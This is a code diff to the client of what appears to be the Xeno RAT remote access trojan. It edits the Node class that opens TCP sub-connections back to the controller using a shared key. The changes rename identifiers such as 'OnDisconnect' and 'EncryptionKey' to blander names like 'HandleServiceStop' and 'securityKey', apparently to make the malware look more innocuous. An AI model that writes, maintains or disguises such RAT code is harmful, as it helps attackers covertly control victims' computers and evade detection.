@@ -13,17 +13,17 @@ namespace xeno_rat_client
         [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
         private static extern int memcmp(byte[] b1, byte[] b2, long count);
         
-        private Action<Node> OnDisconnect;
+        private Action<Node> HandleServiceStop;
         public List<Node> serviceConnections = new List<Node>();
         public SocketHandler sock;
         public Node Parent;
         public int ID = -1;
         public int SetId = -1;
         public int connectionType = -1;
-        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
+        public Node(SocketHandler _sock, Action<Node> _HandleServiceStop)
         {
             sock = _sock;
-            OnDisconnect = _OnDisconnect;
+            HandleServiceStop = _HandleServiceStop;
         }
         public void AddSubNode(Node subNode) 
         {
@@ -50,21 +50,21 @@ namespace xeno_rat_client
                 i?.Disconnect();
             }
             copy.Clear();
-            if (OnDisconnect != null)
+            if (HandleServiceStop != null)
             {
-                OnDisconnect(this);
+                HandleServiceStop(this);
             }
         }
 
 
-        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
+        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> HandleServiceStop = null)
         {
             try
             {
                 Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 await socket.ConnectAsync(sock.sock.RemoteEndPoint);
 
-                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.EncryptionKey, type, ID, OnDisconnect);
+                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.securityKey, type, ID, HandleServiceStop);
                 byte[] byteRetid = new byte[] { (byte)retid };
                 await sub.SendAsync(byteRetid);
                 byte[] worked = new byte[] { 1 };
